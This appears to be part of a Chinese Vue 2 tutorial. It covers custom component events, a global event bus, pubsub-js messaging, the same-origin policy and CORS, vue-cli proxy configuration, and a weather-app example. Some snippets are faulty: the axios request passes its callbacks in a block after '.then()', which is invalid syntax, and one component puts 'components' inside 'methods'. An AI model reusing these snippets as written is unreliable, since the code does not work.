不要在指令后面写太复杂的表达式：

```html
<th class="c1">全选 <input type="checkbox" :checked="isAll"></th>

<script>
import BugItem from './BugItem.vue';
export default {
    name: 'BugList',
    props: ['list', 'modifyResolvedCallBack', 'deleteBugCallBack'],
    computed: {
        count() {
            return this.list.reduce((a, b) => a + (b.resolved ? 1 : 0), 0)
        },
        isAll() {
            return this.list.length == this.count && this.count > 0;
        }
    },
    components: {
        BugItem
    }
}
</script>
```

### 全选和取消全选

通过全选复选框的状态来控制其他复选框的状态，本质是修改 list 数组，所以还是要在 App 中定义回调函数：

```js
selectAllCallBack(flag) {
    this.list.forEach((bug) => {
        bug.resolved = flag;
    })
}
```

然后将这个函数传给 BugList，由 BugList 中的全选复选框通过事件来调用

```vue
<th class="c1">全选 <input type="checkbox" :checked="isAll" @change="selectAll"></th>

<script>
import BugItem from './BugItem.vue';
export default {
    name: 'BugList',
    props: ['list', 'modifyResolvedCallBack', 'deleteBugCallBack', 'selectAllCallBack'],
    methods: {
        selectAll(e) {
            this.selectAllCallBack(e.target.checked);
        }
    }
}
</script>
```

还可以使用 v-model 双向绑定：

```vue
<!-- <th class="c1">全选 <input type="checkbox" :checked="isAll" @change="selectAll"></th> -->
<th class="c1">全选 <input type="checkbox" v-model="isAll"></th>

<script>
import BugItem from './BugItem.vue';
export default {
    name: 'BugList',
    props: ['list', 'modifyResolvedCallBack', 'deleteBugCallBack', 'selectAllCallBack'],
    computed: {
        isAll : {
            get(){
                return this.list.length == this.count && this.count > 0
            },
            set(val) {
                this.selectAllCallBack(val);
            }
        }
    },
    components: {
        BugItem
    },
}
</script>
```

因为 v-model 绑定是复选框的 value 属性，又是 checkd 属性，绑定到了一个计算属性上，所以当 checked 属性发生了改变时，计算属性会重新计算。

### 清除已解决

点击清除已解决按钮后，将列表中勾选上的 bug 都给删除掉。

还是对 list 数组进行操作，所以还是需要在 App 中定义回调函数，然后传给 BugFooter 调用。

App.vue

```js
clearResolvedCallBack() {
    this.list = this.list.filter((bug) => !bug.resolved)
}
```

BugFooter.vue

```vue
<template>
    <div class="footer">
        <button class="small red button" @click="clearResolved">清除已解决</button>
        <span>当前BUG总量 {{ list.length }} 个，已解决 {{count}} 个</span>
    </div>
</template>

<script>
export default {
    name: 'BugFooter',
    props: ['list', 'clearResolvedCallBack'],
    computed: {
        count() {
            let res = 0;
            this.list.forEach(bug => {
                if (bug.resolved) res++;
            });
            return res;
        }
    },
    methods: {
        clearResolved() {
            this.clearResolvedCallBack();
        }
    }
}
</script>
```

### 修改描述信息

+ 当用户的鼠标移动到 bug 描述上的时候，鼠标变为小手
+ 变成小手后，一点击，就变成了文本框，同时获得焦点，可以编辑
+ 失去焦点后，编辑的信息保存，且隐藏文本框，显示出修改后的全新信息

修改 BugItem 中显示描述信息部分的样式：

```vue
<td>
    <span class="desc">{{bug.desc}}</span>
</td>
```

```css
.desc {
    cursor: pointer;
}
```

然后要实现点击变成输入框。可以在一个单元格中放两个元素，一个是 span 用来展示数据，一个是 input 用来输入数据，这两个元素同一时刻只会显示一个。那就可以给 bug 对象扩展一个 editState 属性，为 true 时显示输入框，否则显示文本信息。

```vue
<td>
    <span class="desc">{{bug.desc}}</span>
    <input type="text" :value="bug.desc">
</td>
```

![image-20240430200958925](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404302009363.png)

这两个元素显示与否取决于 bug.editState：

```vue
<td>
    <span v-show="!bug.editState" class="desc">{{bug.desc}}</span>
    <input v-show="bug.editState" type="text" :value="bug.desc">
</td>
```

由于最开始定义 bug 对象的时候没有给 editState 这个属性，当我们这个页面打开的时候，bug.editState 是不存在的，所以是 false，所以给 span 加一个 ! 的符号，刚好可以显示。

然后要给 span 绑定一个点击事件，点击后，进入编辑状态。也就是给 bug 对象扩展一个 editState 属性，且这个 editState 属性具有响应式：

```vue
<td>
    <span v-show="!bug.editState" class="desc" @click="enterEdit">{{bug.desc}}</span>
    <input v-show="bug.editState" type="text" :value="bug.desc">
</td>
<script>
import Vue from 'vue';

export default {
    name: 'BugItem',
    props: ['bug', 'modifyResolvedCallBack', 'deleteBugCallBack'],
    methods: {
        enterEdit() {
            if (this.bug.hasOwnProperty('editState'))
                this.bug.editState = true;
            else
                this.$set(this.bug, 'editState', true);
        }
    }
}
</script>
```

+ 如果已经有了 editState 属性就不用再扩展了，使用 hasOwnProperty 判断是否拥有某个属性

此时，已经可以点击打开文本框了，但是还需要自动获取到焦点，要获取焦点就要先拿到这个文本框，使用 ref 给文本框打上标记，然后获取焦点：

```vue
<input ref="inputDesc" v-show="bug.editState" type="text" :value="bug.desc">
```

```js
enterEdit() {
    if (this.bug.hasOwnProperty('editState'))
        this.bug.editState = true;
    else
        this.$set(this.bug, 'editState', true);
    this.$refs.inputDesc.focus();
}
```

但此时还是不会自动获取焦点，这是因为 enterEdit 这个方法，是将方法体中所有的语句执行完了后，才会渲染页面，这是 Vue 为了提高效率的做法。所以当执行到这句话：`this.$refs.inputDesc.focus();` 时，页面上其实还没有渲染出文本框，所以获取不到焦点，两种解决方法：

+ 第一种：使用 setTimeout，可以不写延迟秒数

  ```js
  enterEdit() {
      if (this.bug.hasOwnProperty('editState'))
          this.bug.editState = true;
      else
          this.$set(this.bug, 'editState', true);
      setTimeout(() => {
          this.$refs.inputDesc.focus();
      })
  }
  ```

+ 第二种：使用 nextTick

  ```js
  enterEdit() {
      if (this.bug.hasOwnProperty('editState'))
          this.bug.editState = true;
      else
          this.$set(this.bug, 'editState', true);
      this.$nextTick(() => {
          this.$refs.inputDesc.focus();
      })
  }
  ```

  nextTick 是 Vue 提供的 API，作用是绑定一个回调函数，这个回调函数会在下一次 DOM 全部渲染完毕后被调用。

接下来当文本框失去焦点后，拿到用户输入的值，更新对应的 bug 对象的描述信息，所以还是需要在 App 中定义修改描述信息的回调函数，给文本框绑定一个失去焦点事件，调用这个回调函数。

App.vue 修改 bug 对象的描述信息，需要知道要修改的对象 id 和新的描述信息

```js
updateDescCallBack(id, desc) {
    this.list.forEach((bug) => {
        if (bug.id === id) bug.desc = desc;
    })
}
```

BugItem.vue 通过失去焦点事件传一个 bug 对象的 id，然后获取到文本框的值，同时判断文本框的值不能是空，然后更新后要隐藏文本框

```js
<template>
    <tr>
        <td><input type="checkbox" :checked="bug.resolved" @change="modifyResolved(bug.id)"></td>
        <td>
            <span v-show="!bug.editState" class="desc" @click="enterEdit">{{bug.desc}}</span>
            <input ref="inputDesc" v-show="bug.editState" type="text" :value="bug.desc" @blur="updateDesc(bug.id)">
        </td>
        <td><button class="small red button" @click="deleteBug(bug.id)">删除</button></td>
    </tr>
</template>

<script>
import Vue from 'vue';

export default {
    name: 'BugItem',
    props: ['bug', 'modifyResolvedCallBack', 'deleteBugCallBack', 'updateDescCallBack'],
    methods: {
        updateDesc(id) {
            let desc = this.$refs.inputDesc.value.trim();
            if (!desc) return  // 空白输入则返回
            this.updateDescCallBack(id, desc);  // 更新
            this.bug.editState = false;  // 隐藏文本框
        }
    }
}
</script>
```

## 组件的自定义事件

### 内置事件的流程

click、keydown、keyup，这些事件都是内置事件。

以下代码实现了点击按钮，在控制台输出一句话的功能

```vue
<template>
    <div>
        <button @click.once="hello">内置事件的实现步骤</button>
        <User></User>
    </div>
</template>

<script>
import User from './components/User.vue'
export default {
    name: 'App',
    methods: {
        hello() {
            console.log('hello vue!')
        },
        components: { User }
    }
}
</script>
```

关于内置事件的实现步骤

+ 第一步：提供事件源（以上代码中的按钮就是一个事件源）
+ 第二步：给事件源绑定事件
  + `v-on:事件名` 或者简写为 `@事件名`
+ 第三步：编写回调函数，将回调函数和事件进行绑定
+ 第四步：等待事件的触发，只要事件触发，则执行回调函数。

### 组件标签上绑定事件

和内置事件的流程差不多

+ 第一步：提供事件源（这个事件源是一个组件）
+ 第二步：给组件绑定事件
  + `v-on:事件名` 或者简写为 `@事件名`
+ 第三步：编写回调函数，将回调函数和事件进行绑定
+ 第四步：等待事件的触发，只要事件触发，则执行回调函数。

对于组件自定义事件来说，要想让事件发生，需要去执行一段代码。这段代码负责去触发这个事件，让这个事件发生。

这段代码在哪里写？事件绑定在 A 组件上，则触发这个事件的代码要在 A 组件当中编写。

给 User 组件绑定一个自定义事件 event1，这个事件名是随意写的，这个事件绑定了一个方法 doSome，当 event1 事件触发时，就会执行这个 doSome 方法：

```vue
<!-- 给User组件绑定一个自定义的事件 -->
<User v-on:event1.once="doSome"></User>

<script>
import User from './components/User.vue'
export default {
    name: 'App',
    methods: {
        hello() {
            console.log('hello vue!')
        },
        doSome(){
            console.log(6666)
        }
    },
    components: { User }
}
</script>
```

那么触发这个 event1 事件，就需要写代码来触发，且这个代码只能写在 User 组件中，因为这个事件是绑定在 User 组件上。在 User 组件中添加一个按钮，按钮点击后，就执行触发 event1 事件的代码：

```vue
<template>
    <div>
        <button @click="triggerEvent1">触发event1事件</button>
    </div>
</template>

<script>
    export default {
        name : 'User',
        methods: {
            triggerEvent1(){
                // 编写触发event1事件的代码
                // this是当前的组件实例：vc
                this.$emit('event1')
            },
        },
    }
</script>
```

触发指定事件使用 vc 上的 $emit 方法，传过去一个事件名。

此时，点击这个触发的按钮，就会触发 event1 事件，从而执行 doSome 函数：

![image-20240501093550939](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405010935241.png)

而在使用 $emit 触发事件的时候，还可以给事件绑定的回调函数传数据过去：

```vue
<script>
    export default {
        name: 'User',
        data() {
            return {
                name: '张三',
                age: 20,
                gender: '男'
            }
        },
        methods: {
            triggerEvent1(){
                // 触发事件的同时，可以给事件绑定的回调函数传数据
                this.$emit('event1', this.name, this.age, this.gender)
            },
        },

    }
</script>
```

那么 event1 事件绑定的函数需要接收这些数据：

```js
/* doSome(name, age, gender){
    console.log(name, age, gender)
} */
// ES6的语法，...params这个params可以看做是一个数组。以数组的形式接收多个参数。
doSome(name, ...params){
    console.log(name, params)
},
```

![image-20240501094238818](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405010942066.png)

那么通过事件的方式，可以实现子组件向父组件传递数据的功能。

总结，到目前为止，父子组件之间如何通信

+ 父---子：通过 props

+ 子---父：

  + 第一种方式：在父中定义一个方法，将方法传递给子，然后在子中调用父传过来的方法，这样给父传数据。（这种方式以后很少使用）

  + 第二种方式：使用组件的自定义事件的方式，也可以完成子向父传数据。

    App组件是父组件，User组件是子组件，子组件向父组件传数据（User给App组件传数据）：

    在父组件当中绑定事件；在子组件当中触发事件。

对于事件的 once 修饰符来说，组件的自定义事件也是可以使用的：

```vue
 <User v-on:event1.once="doSome"></User>
```

### 通过代码完成事件绑定

先创建一个组件（事件源）

```vue
<User ref="user"></User>
```

+ 需要通过 ref 拿到这个组件

接下来需要等这个组件挂载完毕后，才能给他绑定事件，所以用到一个钩子函数 mounted，在父组件 App 的 mounted 中绑定事件：

```js
mounted() {
    // 给ref="user"的组件绑定event1事件，并且给event1事件绑定一个回调函数：doSome
    this.$refs.user.$on('event1', this.doSome)
},
```

而触发事件的代码还是之前的代码。	

还有种写法，保证绑定事件只触发一次：

```js
this.$refs.user.$once('event1', this.doSome)
```

### 解绑自定义事件

哪个组件绑定的，就找哪个组件解绑。event1 事件绑定在 User 组件上的，所以解绑就在 User 组件里解绑。

在 User 中添加一个按钮：

```vue
<button @click="unbinding">解绑事件</button>
```

在这个 unbinding 函数中解绑 event1 事件：

```js
unbinding(){
    // 仅仅解绑this指向的这个组件实例上的event1事件。
    this.$off('event1')
}
```

无论是触发事件还是解绑事件都是通过 `this.` 来调用对应的方法，所以每个组件之间不会有影响，某一个 User 组件的事件触发不会触发其他的 User 组件上的事件，解绑也是这样。

如果解绑多个事件可以使用数组，现在 User 组件上绑定了多个事件：

```vue
<User v-on:event1="doSome" @event2="doOther"></User>
```

解绑的时候，传一个数组：

```js
unbinding(){
    this.$off(['event1', 'event2'])
}
```

如果想解绑所有的事件：

```js
this.$off()
```

### 绑定自定义事件时回调函数的坑

以下代码是在 App 组件的 mounted 函数中给 User 组件绑定事件：

```js
this.$refs.user.$on('event1', this.doSome)
```

在这个代码中，this.doSome 这个回调函数是预先定义出来的，还可以直接写一个 function 或者使用箭头函数。要看看这个回调函数中的 this。

如果回调函数是普通函数：

```js
this.$refs.user.$on('event1', function() {
    console.log(this);
})
```

![image-20240501102558025](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011025320.png)

发现这个 this 是 User 组件，而不是 App 组件。因为如果以这种方式写这个函数，那么这个函数的管理者就是前面的 `this.$refs.user` ，所以这个 this 是 User 组件的实例。

如果是写成 this.doSome 这种形式，因为这个 doSome 是在 App 的 methods 中定义的，所以这个回调函数中的 this 是 App 组件实例。

如果回调函数是一个箭头函数：

```js
this.$refs.user.$on('event1', () => {
    console.log(this);
})
```

![image-20240501103315877](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011033157.png)

这时这个 this 就是 App 组件的实例。因为箭头函数中是没有 this 的，会向外找，往外是 mounted，所以 this 是 App 组件。

以后还是采用这种方式：

```js
this.$refs.user.$on('event1', this.doSome)
```

## 全局事件总线

可以实现所有组件之间的通信。

![image-20240501104623063](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011046338.png)

### 原理

观察 App 组件中给 User 组件绑定事件的代码：

```js
this.$refs.user.$on('event1', this.doSome)
```

还有 User 组件中触发事件的代码：

```js
this.$emit('event1')
```

`$on` 和 `$emit` 方法的调用者其实都是 User 实例，也就是说 App 中的 this.$refs.user 和 User 中的 this 是一个东西，是同一个 vc，所以这个 vc 上有 `$on` 和 `$emit` 两个方法。

可以在所有组件外创建一个 vc 对象，是一个全局的 vc 对象，是一个所有组件共享的 vc 对象。这个 vc 对象上也有 `$on` 和 `$emit` 两个方法，此时就上图而言，想 A1 组件给 B1 组件传递数据的话，那么可以让 A1 和 B1 拿到这个共享的 vc 组件，由 A1 去调用触发事件的代码 `$emit`，由 B1 去调用绑定事件的代码 `$on` ：

![image-20240501153341353](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011533625.png)

那么这个共享的 vc 对象就被称为全局事件总线。为什么要用 vc 对象呢？因为 vc 对象上由 `$on` 和 `$emit` 两个方法。

### 实现

主要考虑两个问题：

+ 共享的 vc 对象怎么造出来
+ 其他组件怎么拿到这个共享的组件

在 main.js 中，要创建一个 vc 对象，就要先获取 VueComponent 的构造函数，然后再创建：

```js
// 获取VueComponent构造函数
const VueComponentConstructor = Vue.extend({})
// 创建一个共享的vc对象
const globalvc = new VueComponentConstructor()
```

为了让其他的组件获取到这个 globalvc，可以将它作为 Vue 的原型对象的属性：

```js
// 给“Vue的原型对象”扩展一个x属性，x属性指向了这个共享的vc对象
// 给“Vue的原型对象”扩展的这个x属性，其他的组件vc都是可以直接访问到的。
Vue.prototype.x = globalvc
```

现在有一个 App 组件，App 下有一个 User 子组件，User 下有一个 Vip 子组件，现在要 Vip 给 App 组件传递数据：

Vip.vue

```vue
<template>
    <div>
        <button @click="triggerEventx">向App组件传递数据</button>
    </div>
</template>

<script>
export default {
    name: "Vip",
    data() {
        return {
            name: "zsm"
        }
    },
    methods: {
        triggerEventx() {
            // 触发事件
            this.x.$emit("eventx", this.name);
        }
    }   
}
</script>
```

App.vue

```vue
<template>
    <div>
       <User></User>
    </div>
</template>

<script>
import User from './components/User.vue'
export default {
    name: 'App',
    mounted() {
        // 获取全局事件总线，绑定事件
        this.x.$on('eventx', this.hello);
    },
    methods: {
        hello(name) {
            console.log('hello vue!', name)
        },
    },
    components: { User }
}
</script>
```

效果：

![image-20240501155624880](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011556980.png)

好消息：`$on` 和 `$emit` 两个方法在 vc 上有，在 vm 上也有，所以不需要单独创建一个共享的 vc 对象，直接使用 vm 对象：在 main.js 中

```js
// const VueComponentConstructor = Vue.extend({})
// const globalvc = new VueComponentConstructor();
// Vue.prototype.x = globalvc

const vm = new Vue({
render(createElement) {
   return createElement(App)
}
}).$mount('#app')

Vue.prototype.x = vm
```

这样写是不行的，会直接报错，因为创建 Vue 实例结束后，整个页面都已经渲染完了，再给 Vue 原型扩展属性就已经晚了。

所以此时就可以使用 beforeCreate 钩子函数：

```js
new Vue({
   render(createElement) {
      return createElement(App)
   },
   beforeCreate() {
      Vue.prototype.x = this
   }
}).$mount('#app')
```

这样在 Vip 组件中使用 `this.x.$emit()` 时的这个 x 就不再是 vc 了，而是 vm。

全局事件总线有个通用的名字：`$bus`：

```js
new Vue({
   el: '#app',
   render: h => h(App),
   beforeCreate() {
      Vue.prototype.$bus = this
   }
})
```

注意：在全局事件总线上绑定了很多组件的事件，当某个组件被销毁的时候，总线上对应的事件也应该被销毁，所以要在组件的 beforeDestroy 钩子中使用 `$off` 解绑对应的事件。

### 总结组件间通信方式

![image-20240501161139931](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011611224.png)

## 消息的订阅与发布

这是一种机制，使用这种机制也可以完成任意组件之间数据的传递，能够完成和全局事件总线一样的功能。

假设 A 组件是订阅方，B 组件是发布方，订阅放负责接收数据，发布方负责发送数据。

那么 A 组件中有个订阅的方法：

```js
订阅("消息的名字", function(a, b) {
    // 这个回调函数会在发布方发布消息后自动调用
})
```

那么 B 组件中有个发布的方法：

```js
发布("消息的名字", 消息的内容)
```

这两个参数就会被传递到订阅方法中的回调函数的参数列表中，a 就是消息的名字，b 就是消息的内容

![image-20240501163258237](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011632542.png)

想要使用这个机制，需要安装第三方库 pubsub-js。

在终端中项目目录下：

```
npm i pubsub-js
```

装成功了后，就有一个对象可以使用了，这个对象就是 pubsub。

现在有三个组件 App、A、B，A、B 在 App 中注册并使用了，要实现 A、B 间的数据传递。在 A 组件中订阅，在 B 组件中发布。

在 A 组件中，等 A 组件挂载之后就订阅消息，要订阅消息，就需要用到 pubsub 对象，需要先引入这个对象，然后调用相关方法：

```vue
<script>
import pubsub from "pubsub-js";  // 引入pubsub对象

export default {
    name: "A",
    mounted() {  // 挂载后就开始订阅
        pubsub.subscribe('2024消息', function (messageName, message) {
            console.log("消息的名字：",messageName);
            console.log("消息的内容：",message);
        })
    }
}
</script>
```

+ messageName：消息的名字
+ message：具体的消息（数据）

在 B 组件中，通过一个按钮点击来发布消息，发布消息也需要 pubsub 对象：

```vue
<template>
    <div>
        <button @click="publish">发布</button>
    </div>
</template>

<script>
import pubsub from 'pubsub-js';

export default {
    name: "B",
    methods: {
        publish() {
            pubsub.publish("2024消息", "这是具体的消息");
        }
    }
}
</script>
```

+ 发布方法的第一个参数是消息的名字，要和订阅方法的消息名字一致

然后运行项目，查看结果：

![image-20240501165741553](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011702046.png)

跟全局事件总线一样，A 组件订阅了消息，当 A 组件销毁的时候，一定要记得取消订阅。取消订阅不是根据名字来取消，而是通过 id，这个 id 是订阅消息时返回的 id：

```js
export default {
    name: "A",
    mounted() {
        this.pid = pubsub.subscribe('2024消息', function (messageName, message) {
            console.log("消息的名字：",messageName);
            console.log("消息的内容：",message);
        })
    },
    beforeDestroy() {
        pubsub.unsubscribe(this.pid);
    }
}
```

订阅中的回调函数尽量写箭头函数，因为写成普通函数的话，这个函数中的 this 是一个 undefined：

```js
this.pid = pubsub.subscribe('2024消息', function (messageName, message) {
    console.log("消息的名字：",messageName);
    console.log("消息的内容：",message);
    console.log(this)
})
```

![image-20240501170455550](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011704803.png)

写成箭头函数的话就能保证 this 是 组件实例

```js
this.pid = pubsub.subscribe('2024消息', (messageName, message) => {
    console.log("消息的名字：", messageName);
    console.log("消息的内容：", message);
    console.log(this)
})
```

![image-20240501170534160](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011705410.png)

全局数据总线和消息订阅机制，优先使用全局数据总线。

# Vue与Ajax

## 回顾发送ajax异步请求的方法

1、原生方式，使用浏览器内置的 JS 对象 XMLHttpRequest

```js
(1)const xhr = new XMLHttpRequest()
(2)xhr.onreadystatechange = function(){}
(3)xhr.open()
(4)xhr.send()
```

2、原生方式，使用浏览器内置的 JS 函数 fetch

```js
fetch(‘url’, {method : ‘GET’}).then().then()
```

3、第三方库方式，JS 库 jQuery（对 XMLHttpRequest 进行的封装）

```js
(1)$.get()
(2)$.post()
```

4、第三方库方式，基于 Promise 的 HTTP 库：axios （对 XMLHttpRequest 进行的封装）

```js
axios.get().then()
```

axios 是Vue官方推荐使用的。

## 回顾ajax跨域

**什么是跨域访问？**

在 a 页面中想获取 b 页面中的资源，如果 a 页面和 b 页面所处的==协议、域名、端口==不同（只要有一个不同），所进行的访问行动都是跨域的。

**哪些跨域行为是允许的？**

① 直接在浏览器地址栏上输入地址进行访问

② 超链接

③ `<img src="”其它网站的图片是允许的”>"`

④` <link href="其它网站的css文件是允许的">`

⑤ `<script src="其它网站的js文件是允许的">`

⑥ ......

**哪些跨域行为是不允许的？**

① AJAX 请求是不允许的

② Cookie、localStorage、IndexedDB 等存储性内容是不允许的

③ DOM 节点是不允许的

**同源策略**

AJAX 请求无法跨域访问的原因：同源策略。

同源策略是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到 XSS、CSRF 等攻击。同源是指"协议+域名+端口"三者相同，即便两个不同的域名指向同一个 ip 地址，也非同源。

AJAX 请求不允许跨域并不是请求发不出去，请求能发出去，服务端能收到请求并正常返回结果，只是结果被浏览器拦截了。

**解决AJAX跨域访问的方案包括哪些**

CORS方案（工作中常用的）

+ 这种方案主要是后端的一种解决方案，**被访问的资源**设置响应头，告诉浏览器我这个资源是允许跨域访问的：

  ```java
  response.setHeader("Access-Control-Allow-Origin", "http://localhost:8080");
  ```

jsonp 方案（面试常问的）

+ 采用的是`<script src="">`不受同源策略的限制来实现的，但只能解决GET请求。

代理服务器方案（工作中常用的）

+ Nginx 反向代理
+ Node 中间件代理
+ vue-cli（Vue 脚手架自带的 8080 服务器也可以作为代理服务器，需要通过配置 vue.config.js 来启用这个代理）

还有很多：

+ postMesssage
+ websocket
+ window.name + iframe
+ location.hash + iframe
+ document.domain + iframe

**代理服务器方案的实现原理**

同源策略是浏览器需要遵循的标准，而如果是服务器向服务器请求就无需遵循同源策略的。

![image-20240501190127685](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011901962.png)

**演示ajax跨域问题**

App.vue

```vue
<template>
    <div>
        <Bugs></Bugs>
    </div>
</template>

<script>
    import Bugs from './components/Bugs.vue'
    export default {
        name : 'App',
        components : {Bugs}
    }
</script>
```

Bugs.vue

```vue
<template>
    <div><button @click="getBugs">发送ajax请求</button></div>
</template>

<script>
export default {
    name: 'Bugs',
    methods: {
        getBugs() {
            // 发送ajax请求
        }
    }
}
</script>
```

使用 axios 发送 ajax 请求，先要安装 axios：

```
npm i axios
```

安装完后，要用 axios 需要先引入，

```js
import axios from 'axios';

export default {
    name: 'Bugs',
    methods: {
        getBugs() {
            // 请求的地址写在get中
            axios.get('http://localhost:8000/vue/bugs').then() {
                // 响应回来后，执行这个回调函数
                respone => {
                    console.log('服务器响应回来的数据：', respone.data);
                },
                // 请求响应过程中出现问题，执行这个回调函数
                error => {
                    console.log('错误信息：', error.message);
                }
            }
        }
    }
}
```

![image-20240501192859212](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011928519.png)

## 启用Vue脚手架内置服务器

### 简单开启

在 vue.config.js 中添加如下配置：

```json
devServer: {
    proxy: 'http://localhost:8000' 
}
```

+ 含义：Vue 脚手架内置的 8080 服务器负责代理访问 8000 服务器

+ 注意：这个地址就写到端口号位置即可，后面具体的路径不需要写。

vue.config.js 改了之后，需要重启服务器才能生效。

那么发送 ajax 请求的 axios 请求的地址原先是：

```js
 axios.get('http://localhost:8000/vue/bugs').then()
```

就需要改成这样：

```js
 axios.get('http://localhost:8080/vue/bugs').then()
```

原理：当发送 AJAX 请求的时候，会优先从自己的服务器（http://localhost:8080）当中找 /vue/bugs 资源，如果找不到，就会找代理，然后去 http://localhost:8000 找 /vue/bugs 资源。

当前按钮这个页面就是在 8080 服务器上，又去访问 8080 服务器上的资源，所以 http://localhost:8080 可以省略。

```js
 axios.get('/vue/bugs').then()
```

这种简单配置不支持配置多个代理。

### 高级开启

支持配置多个代理。

官网上的配置模板：

```json
devServer: {
    proxy: {
        '/api': {
            target: '<url>',
            ws: true,
            changeOrigin: true
        },
        '/foo': {
            target: '<other_url>'
        }
    }
}
```

在 vue.config.js 中修改配置为：

```json
devServer: {
    proxy: {
        // 凡是请求路径以 /api 开始的，都走这个代理
        '/api': {
            target: 'http://localhost:8000',
            ws: true,  // 开启对websocket的支持（websocket是一种实时推送技术），默认不写就是true
            changeOrigin: true  // 默认是true，表示改变起源（让对方服务器不知道我们的真正起源）
        },
    }
}
```

然后发送 ajax 请求的地方也要修改以下路径：

```js
axios.get('/api/vue/bugs').then()
```

路径是由 /api 开头的，就会走 http://localhost:8000 这个代理，最终会将路径拼成：http://localhost:8000/api/vue/bugs：

![image-20240501195025937](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011950253.png)

所以这时候就需要将 /api 给他删掉，有一个配置 pathRewrite，：v

```json
devServer: {
    proxy: {
        '/api': {
            target: 'http://localhost:8000',
            pathRewrite: {'^/api' : ''},
            ws: true,
            changeOrigin: true
        },
    }
}
```

+ pathRewrite: {'^/api' : ''} 会将路径中的 /api 替换成 '' (空串)，这个 '^/api' 是一个正则表达式，^ 表示字符串的开始

+ 更多信息可以看 https://github.com/chimurai/http-proxy-middleware#proxycontext-config

  ![image-20240501195610107](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405011956421.png)

这样最终访问的路径是 http://localhost:8000/vue/bugs。

## vue-resource插件

了解内容。

Vue 插件库中的一个插件，也可以发送 ajax 请求。这个插件的使用就是 plugin 的使用。

先安装：

```
npm i vue-resource
```

然后在 main.js 中引入：

```js
import vueResource from 'vue-resource'
```

然后使用插件，也在 main.js 中：

```js
Vue.use(vueResource)
```

使用该插件之后，项目中所有的 vm 和 vc 实例上都添加了：$http 属性。

使用这个插件发送 ajax 请求：

```js
this.$http.get('/api/vue/bugs').then()
```

+ this.$http 的用法和 axios 完全一样。

## 综合案例-天气预报

效果：

![image-20240501201935508](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012019968.png)

天气的数据借助国外的免费的一个接口：open weather map，链接：https://openweathermap.org/。

### 实现静态组件

![image-20240501202054543](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012020911.png)

App 组件下有两个子组件：Search、Weather

App.vue

```vue
<template>
    <div class='card'>
        <Search></Search>
        <Weather></Weather>
    </div>
</template>

<script>
import Search from './components/Search.vue'
import Weather from './components/Weather.vue'
export default {
    name: 'App',
    components: { Search, Weather }
}
</script>

<style>
/*公共样式*/
* {
    margin: 0;
    padding: 0;
    font-family: 'Poppins', sans-serif;
    box-sizing: border-box;
}

body {
    background: #222;
}

.card {
    width: 70%;
    max-width: 470px;
    background: linear-gradient(135deg, #00feba, #5b548a);
    color: #fff;
    margin: 100px auto 0;
    border-radius: 20px;
    padding: 40px 35px;
    text-align: center;
}
</style>
```

Search.vue

```vue
<template>
    <div class="search">
        <input type="text" placeholder="请输入城市名字" spellcheck="false">
        <button><img src="../assets/images/search.png"></button>
    </div>
</template>

<script>
export default {
    name: 'Search'
}
</script>

<style scoped>
/*搜索框样式*/
.search {
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.search input {
    border: 0;
    outline: 0;
    background: #ebfffc;
    color: #555;
    padding: 10px 25px;
    height: 60px;
    border-radius: 30px;
    flex: 1;
    margin-right: 16px;
    font-size: 18px;
}

.search button {
    border: 0;
    outline: 0;
    background: #ebfffc;
    border-radius: 50%;
    width: 60px;
    height: 60px;
    cursor: pointer;
}

.search button img {
    width: 16px;
}
</style>
```

Weather.vue

```vue
<template>
    <div class="weather">
        <img src="../assets/images/rain.png" class="weather-icon">
        <h1 class="temp">22°c</h1>
        <h2 class="city">北京</h2>
        <div class="details">
            <div class="col">
                <img src="../assets/images/humidity.png" />
                <div>
                    <p class="humidity">50%</p>
                    <p>湿度</p>
                </div>
            </div>
            <div class="col">
                <img src="../assets/images/wind.png">
                <div>
                    <p class="wind">15 米/秒</p>
                    <p>风力</p>
                </div>
            </div>
        </div>
    </div>
</template>

<script>
export default {
    name: 'Weather'
}
</script>

<style scoped>
/*天气样式*/
.weather-icon {
    width: 170px;
    margin-top: 30px;
}

.weather h1 {
    font-size: 80px;
    font-weight: 500;
}

.weather h2 {
    font-size: 45px;
    font-weight: 400;
    margin-top: -10px;
}

.details {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 20px;
    margin-top: 50px;
}

.col {
    display: flex;
    align-items: center;
    text-align: left;
}

.col img {
    width: 40px;
    margin-right: 10px;
}

.humidity,
.wind {
    font-size: 28px;
    margin-top: -6px;
}
</style>
```

还有在 src/assets/ 下建一个文件夹 images，将所有的素材图片全部放进去。

目前结果：

![image-20240501203341471](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012033941.png)

### 阅读天气API接口文档

网址：https://openweathermap.org/

先注册登录。

登录上了后，先找到 API key：

![image-20240501203951769](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012039189.png)

这个 API key 就是每个开发者人员的身份标识，这个 API key 要在注册后 1 小时后才能生效：

![image-20240501204121000](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012041427.png)

然后查看获取当前天气的API：

![image-20240501204318212](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012043659.png)

点击这个 API doc，进入 API 文档：

![image-20240501204416222](https://gitee.com/LowProfile666/image-bed/raw/master/img/202405012044613.png)

看到这个 api 的调用接口路径，通过经度纬度获取城市的天气：

```
https://api.openweathermap.org/data/2.5/weather?lat={lat}&lon={lon}&appid={API key}
```

有三个参数

